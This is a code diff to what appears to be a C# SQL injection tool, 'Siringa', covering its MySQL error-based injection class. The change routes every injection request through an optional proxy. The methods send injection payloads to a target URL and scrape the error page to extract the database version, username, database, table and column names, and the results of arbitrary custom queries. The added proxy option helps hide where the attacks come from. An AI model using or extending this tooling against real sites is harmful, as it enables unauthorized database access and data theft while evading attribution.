@@ -74,7 +74,7 @@ namespace Siringa.Engine.Implementations.InjectionStrategies.MySql.ErrorBased
                                                 html.IndexOf(_injectionResultUpperBound) - html.IndexOf(_injectionResultLowerBound) -
                                                 _injectionResultLowerBound.Length);
                 }
-                catch (Exception ex)
+                catch
                 {
                     string userFriendlyException = "Could not parse sql injection result";
 
@@ -99,7 +99,7 @@ namespace Siringa.Engine.Implementations.InjectionStrategies.MySql.ErrorBased
         #region Public
 
         public IQueryRunner QueryRunner { get; set; }
-
+        public IProxyDetails ProxyDetails { get; set; }
         public string DbVulnerableVersionFrom 
         {
             get
@@ -114,6 +114,8 @@ namespace Siringa.Engine.Implementations.InjectionStrategies.MySql.ErrorBased
                 return "5.1.64";
             }
         }
+
+        public bool UseProxy { get; set; }
 
         public string Url { get; set; }
 
@@ -131,7 +133,7 @@ namespace Siringa.Engine.Implementations.InjectionStrategies.MySql.ErrorBased
         {
             string result = string.Empty;
             string query = QueryHelper.CreateQuery(Url,_exploit,_payloadGetVersion);
-            string pageHtml = QueryRunner.GetPageHtml(query);
+            string pageHtml = QueryRunner.GetPageHtml(query, UseProxy?ProxyDetails:null);
             result = GetAnswerFromHtml(pageHtml);
             return result;
         }
@@ -140,7 +142,7 @@ namespace Siringa.Engine.Implementations.InjectionStrategies.MySql.ErrorBased
         {
             string result = string.Empty;
             string query = QueryHelper.CreateQuery(Url, _exploit, _payloadGetUsername);
-            string pageHtml = QueryRunner.GetPageHtml(query);
+            string pageHtml = QueryRunner.GetPageHtml(query, UseProxy ? ProxyDetails : null);
             result = GetAnswerFromHtml(pageHtml);
             return result;
         }
@@ -148,7 +150,7 @@ namespace Siringa.Engine.Implementations.InjectionStrategies.MySql.ErrorBased
         {
             string result = string.Empty;
             string query = QueryHelper.CreateQuery(Url, _exploit, _payloadGetCurrentDatabaseName);
-            string pageHtml = QueryRunner.GetPageHtml(query);
+            string pageHtml = QueryRunner.GetPageHtml(query, UseProxy ? ProxyDetails : null);
             result = GetAnswerFromHtml(pageHtml);
             return result;
         }
@@ -157,7 +159,7 @@ namespace Siringa.Engine.Implementations.InjectionStrategies.MySql.ErrorBased
         {
             int count = 0;
             string query = QueryHelper.CreateQuery(Url, _exploit, _payloadGetDatabasesCount);
-            string pageHtml = QueryRunner.GetPageHtml(query);
+            string pageHtml = QueryRunner.GetPageHtml(query, UseProxy ? ProxyDetails : null);
             string countString = GetAnswerFromHtml(pageHtml);
             int.TryParse(countString, out count);
             return count;
@@ -172,7 +174,7 @@ namespace Siringa.Engine.Implementations.InjectionStrategies.MySql.ErrorBased
             else
                 payload = _payloadGetTableCount;
             string query = QueryHelper.CreateQuery(Url, _exploit, payload);
-            string pageHtml = QueryRunner.GetPageHtml(query);
+            string pageHtml = QueryRunner.GetPageHtml(query, UseProxy ? ProxyDetails : null);
             string countString = GetAnswerFromHtml(pageHtml);
             int.TryParse(countString, out count);
             return count;
@@ -190,7 +192,7 @@ namespace Siringa.Engine.Implementations.InjectionStrategies.MySql.ErrorBased
             else
                 payload = string.Format(_payloadGetTableColumnCount, SelectedTable);
             string query = QueryHelper.CreateQuery(Url, _exploit, payload);
-            string pageHtml = QueryRunner.GetPageHtml(query);
+            string pageHtml = QueryRunner.GetPageHtml(query, UseProxy ? ProxyDetails : null);
             string countString = GetAnswerFromHtml(pageHtml);
             int.TryParse(countString, out count);
             return count;
@@ -200,7 +202,7 @@ namespace Siringa.Engine.Implementations.InjectionStrategies.MySql.ErrorBased
         {
             string result = string.Empty;
             string query = QueryHelper.CreateQuery(Url, _exploit, string.Format(_payloadGetSingleDatabaseName, startingFrom.ToString()));
-            string pageHtml = QueryRunner.GetPageHtml(query);
+            string pageHtml = QueryRunner.GetPageHtml(query, UseProxy ? ProxyDetails : null);
             result = GetAnswerFromHtml(pageHtml);
             return result;
         }
@@ -213,7 +215,7 @@ namespace Siringa.Engine.Implementations.InjectionStrategies.MySql.ErrorBased
             else
                 payload = string.Format(_payloadGetSingleTableName, startingFrom);
             string query = QueryHelper.CreateQuery(Url, _exploit, payload);
-            string pageHtml = QueryRunner.GetPageHtml(query);
+            string pageHtml = QueryRunner.GetPageHtml(query, UseProxy ? ProxyDetails : null);
             result = GetAnswerFromHtml(pageHtml);
             return result;
         }
@@ -226,7 +228,7 @@ namespace Siringa.Engine.Implementations.InjectionStrategies.MySql.ErrorBased
             else
                 payload = string.Format(_payloadGetSingleColumnName, SelectedTable, startingFrom);
             string query = QueryHelper.CreateQuery(Url, _exploit, payload);
-            string pageHtml = QueryRunner.GetPageHtml(query);
+            string pageHtml = QueryRunner.GetPageHtml(query, UseProxy ? ProxyDetails : null);
             result = GetAnswerFromHtml(pageHtml);
             return result;
         }
@@ -247,7 +249,7 @@ namespace Siringa.Engine.Implementations.InjectionStrategies.MySql.ErrorBased
             payload = string.Format(_payloadCustomQueryCount,CustomQuery);
 
             string query = QueryHelper.CreateQuery(Url, _exploit, payload);
-            string pageHtml = QueryRunner.GetPageHtml(query);
+            string pageHtml = QueryRunner.GetPageHtml(query, UseProxy ? ProxyDetails : null);
             string countString = GetAnswerFromHtml(pageHtml);
             int.TryParse(countString, out count);
             return count;
@@ -263,7 +265,7 @@ namespace Siringa.Engine.Implementations.InjectionStrategies.MySql.ErrorBased
                 payload = string.Format("{0} LIMIT {1},1", CustomQuery, startingFrom);
 
             string query = QueryHelper.CreateQuery(Url, _exploit, payload);
-            string pageHtml = QueryRunner.GetPageHtml(query);
+            string pageHtml = QueryRunner.GetPageHtml(query, UseProxy ? ProxyDetails : null);
             result = GetAnswerFromHtml(pageHtml);
 
             return result;
